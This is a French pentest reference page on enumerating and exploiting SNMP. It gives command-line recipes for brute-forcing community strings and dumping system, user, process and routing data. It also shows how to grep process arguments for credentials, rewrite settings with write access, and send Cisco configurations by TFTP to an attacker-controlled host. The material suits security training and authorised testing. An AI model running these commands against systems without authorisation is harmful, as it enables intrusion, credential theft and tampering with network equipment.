# SNMP Enumeration

SNMP (Simple Network Management Protocol) est un protocole de gestion réseau utilisé pour surveiller et administrer les équipements réseau — routeurs, switches, imprimantes, serveurs. En pentest, SNMP est une cible privilégiée car il expose fréquemment des informations sensibles sur l'infrastructure et peut être configuré avec des community strings par défaut ou faibles.

## Objectifs

- Identifier les services SNMP exposés
- Tester les community strings par défaut
- Enumérer les informations système (OS, interfaces, processus)
- Extraire les utilisateurs et configurations
- Identifier les versions vulnérables (SNMPv1, SNMPv2c)

## Ports

| Port | Service | Description |
|---|---|---|
| 161 | SNMP | Requêtes agent (UDP) |
| 162 | SNMP Trap | Notifications agent vers manager (UDP) |

## Quick Enumeration

::: code-group
```bash [Nmap]
nmap -p161 -sU --script snmp-info,snmp-sysdescr,snmp-brute <target>
```
```bash [onesixtyone]
onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings.txt <target>
```
```bash [snmpwalk]
snmpwalk -v2c -c public <target>
```
```bash [NetExec]
nxc snmp <target> -u '' -p ''
```

:::

## Workflow Pentest
```
1. Scan du port 161 UDP
2. Identification de la version SNMP
3. Bruteforce des community strings
4. Enumération MIB complète
5. Extraction des informations sensibles
6. Identification des OIDs intéressants
7. Exploitation des mauvaises configurations
8. Modification de configuration si community string RW
```

## Nmap

### Scan basique
```bash
# SNMP tourne sur UDP
nmap -p161 -sU <target>
nmap -p161,162 -sU <target>
```

### Détection version
```bash
nmap -p161 -sU -sV <target>
```

### Scripts NSE
```bash
# Info système
nmap -p161 -sU --script snmp-info <target>

# Description système
nmap -p161 -sU --script snmp-sysdescr <target>

# Interfaces réseau
nmap -p161 -sU --script snmp-interfaces <target>

# Processus actifs
nmap -p161 -sU --script snmp-processes <target>

# Logiciels installés
nmap -p161 -sU --script snmp-win32-software <target>

# Utilisateurs Windows
nmap -p161 -sU --script snmp-win32-users <target>

# Services Windows
nmap -p161 -sU --script snmp-win32-services <target>

# Bruteforce community string
nmap -p161 -sU --script snmp-brute <target>
nmap -p161 -sU --script snmp-brute \
  --script-args brute.firstonly=true <target>

# Full enum
nmap -p161 -sU --script snmp-* <target>
```

## Community Strings

Les community strings fonctionnent comme des mots de passe — elles contrôlent l'accès aux données SNMP.

| Community String | Type | Accès |
|---|---|---|
| `public` | Lecture | RO — Read Only |
| `private` | Ecriture | RW — Read Write |
| `manager` | Lecture | RO |
| `community` | Lecture | RO |
| `snmp` | Lecture | RO |

### Bruteforce — onesixtyone
```bash
# Bruteforce community strings
onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings.txt <target>

# Sur un subnet
onesixtyone -c community_strings.txt -i hosts.txt

# Avec délai
onesixtyone -c community_strings.txt <target> -w 100
```

### Bruteforce — Hydra
```bash
hydra -P /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings.txt \
  <target> snmp
```

### Bruteforce — Metasploit
```bash
use auxiliary/scanner/snmp/snmp_login
set RHOSTS <target>
set PASS_FILE /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings.txt
run
```

## Enumeration SNMP

### snmpwalk — Dump complet
```bash
# SNMPv1
snmpwalk -v1 -c public <target>

# SNMPv2c
snmpwalk -v2c -c public <target>

# SNMPv3 avec authentification
snmpwalk -v3 -u user -l authPriv \
  -a MD5 -A authpassword \
  -x DES -X privpassword <target>

# OID spécifique
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1

# Sauvegarder le dump
snmpwalk -v2c -c public <target> > snmp_dump.txt
```

### snmpget — OID spécifique
```bash
# Récupérer un OID précis
snmpget -v2c -c public <target> 1.3.6.1.2.1.1.1.0

# Description système
snmpget -v2c -c public <target> sysDescr.0

# Nom du système
snmpget -v2c -c public <target> sysName.0
```

### OIDs importants

| OID | Description |
|---|---|
| `1.3.6.1.2.1.1.1.0` | Description système (OS, version) |
| `1.3.6.1.2.1.1.3.0` | Uptime |
| `1.3.6.1.2.1.1.4.0` | Contact administrateur |
| `1.3.6.1.2.1.1.5.0` | Nom du système (hostname) |
| `1.3.6.1.2.1.1.6.0` | Localisation |
| `1.3.6.1.2.1.2.2` | Interfaces réseau |
| `1.3.6.1.2.1.4.20` | Adresses IP |
| `1.3.6.1.2.1.4.21` | Table de routage |
| `1.3.6.1.2.1.4.22` | Table ARP |
| `1.3.6.1.2.1.6.13` | Connexions TCP actives |
| `1.3.6.1.2.1.25.1.6.0` | Processus actifs |
| `1.3.6.1.2.1.25.4.2.1.2` | Noms des processus |
| `1.3.6.1.2.1.25.4.2.1.4` | Chemins des processus |
| `1.3.6.1.2.1.25.6.3.1.2` | Logiciels installés |
| `1.3.6.1.4.1.77.1.2.25` | Utilisateurs Windows |
| `1.3.6.1.2.1.25.3.2.1.3` | Périphériques connectés |

### snmp-check — Enumération complète
```bash
# Enumération complète
snmp-check <target>
snmp-check <target> -c public
snmp-check <target> -v 2c -c public

# Cibler une information
snmp-check <target> -c public -o users
snmp-check <target> -c public -o processes
snmp-check <target> -c public -o network
```

### NetExec
```bash
# Scan SNMP
nxc snmp <target>
nxc snmp <target> -u '' -p 'public'

# Sur un subnet
nxc snmp 192.168.1.0/24 -u '' -p 'public'
```

## Extraction d'Informations Sensibles

### Informations système
```bash
# Description OS
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.1.0

# Hostname
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.5.0

# Uptime
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.3.0

# Contact admin
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.4.0
```

### Réseau
```bash
# Interfaces réseau
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.2.2

# Adresses IP
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.4.20

# Table de routage
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.4.21

# Table ARP
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.4.22

# Connexions TCP
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.6.13
```

### Processus & Logiciels
```bash
# Processus actifs
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2

# Chemins des processus
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.4

# Logiciels installés
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2
```

### Utilisateurs Windows
```bash
# Via SNMP OID Windows
snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25

# Via snmp-check
snmp-check <target> -c public -o users
```

### Credentials dans les processus
```bash
# Chercher des credentials dans les commandes de processus
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.5 | grep -i "pass\|pwd\|user\|credential"
```

## SNMPv3 Enumeration

SNMPv3 apporte l'authentification et le chiffrement — plus sécurisé mais toujours énumérable.
```bash
# Enumération des utilisateurs SNMPv3
nmap -p161 -sU --script snmp-brute \
  --script-args snmp-brute.communitiesdb=users.txt <target>

# Via Metasploit
use auxiliary/scanner/snmp/snmp_enumusers
set RHOSTS <target>
run

# snmpwalk avec SNMPv3
snmpwalk -v3 -u admin -l authPriv \
  -a SHA -A authpassword \
  -x AES -X privpassword <target>
```

## Exploitation

### Community String en écriture (RW)

Si la community string `private` ou une autre en écriture est trouvée :
```bash
# Modifier un OID
snmpset -v2c -c private <target> 1.3.6.1.2.1.1.5.0 s "NewHostname"

# Modifier la configuration réseau
snmpset -v2c -c private <target> \
  1.3.6.1.2.1.4.21.1.7.0.0.0.0 a <new_gateway>
```

### Cisco — Extraction de configuration
```bash
# Enumérer les équipements Cisco
snmpwalk -v2c -c public <target> 1.3.6.1.4.1.9

# Extraire la configuration IOS via TFTP
snmpset -v2c -c private <target> \
  1.3.6.1.4.1.9.2.1.55.0 s "<ATK_IP>"
snmpset -v2c -c private <target> \
  1.3.6.1.4.1.9.2.1.56.0 i 1

# Via Metasploit
use auxiliary/scanner/snmp/cisco_config_tftp
set RHOSTS <target>
set COMMUNITY private
set LHOST <ATK>
run
```

### Recherche d'exploits
```bash
searchsploit snmp
searchsploit "net-snmp"
```

## Points d'attaque

- Community strings par défaut (`public`, `private`)
- SNMPv1 / SNMPv2c pas de chiffrement ni d'authentification forte
- Community string en écriture modification de configuration possible
- Informations sensibles exposées (processus, utilisateurs, réseau)
- Credentials dans les arguments de processus
- Equipements réseau Cisco / HP avec SNMP exposé sur Internet
- Absence de filtrage IP sur le port 161

::: info Tips 

- SNMP tourne sur **UDP** ne pas oublier `-sU` avec Nmap sinon aucun résultat
- `onesixtyone` est l'outil le plus rapide pour bruteforcer les community strings sur un subnet entier
- `snmp-check` donne le résultat le plus lisible pour une énumération rapide
- Les processus Windows via SNMP révèlent souvent des credentials en clair dans les arguments de ligne de commande
- Une community string `private` en RW sur un équipement Cisco permet d'exfiltrer la configuration complète via TFTP
- Corréler les informations SNMP (IPs, hostnames, routage) avec la cartographie réseau BloodHound / Nmap
- SNMPv3 sans liste de users valides est difficile à attaquer se concentrer sur SNMPv1/v2c

:::

::: details Checklist

- Port 161 UDP ouvert identifié
- Version SNMP détectée (v1 / v2c / v3)
- Community strings bruteforcées
- Community string valide trouvée
- Dump MIB complet effectué
- Informations système extraites
- Interfaces et routage récupérés
- Processus et logiciels énumérés
- Utilisateurs Windows extraits
- Credentials dans les processus cherchés
- Community string RW testée
- Configuration équipement réseau extraite

:::

## Notes
```
# Notes 
```

## Tools

- [Nmap](https://nmap.org/)
- [onesixtyone](https://github.com/trailofbits/onesixtyone)
- [snmpwalk](https://linux.die.net/man/1/snmpwalk)
- [snmp-check](https://www.nothink.org/codes/snmpcheck/index.php)
- [Metasploit](https://www.metasploit.com/)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)

## Ressources

- [HackTricks SNMP Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)
- [PayloadsAllTheThings SNMP](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Nmap SNMP Scripts](https://nmap.org/nsedoc/categories/snmp.html)
- [SNMP OID Reference](http://www.oid-info.com/)
- [SecLists SNMP Community Strings](https://github.com/danielmiessler/SecLists/tree/master/Discovery/SNMP)



<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/enumeration/snmp.md)</span>

</div>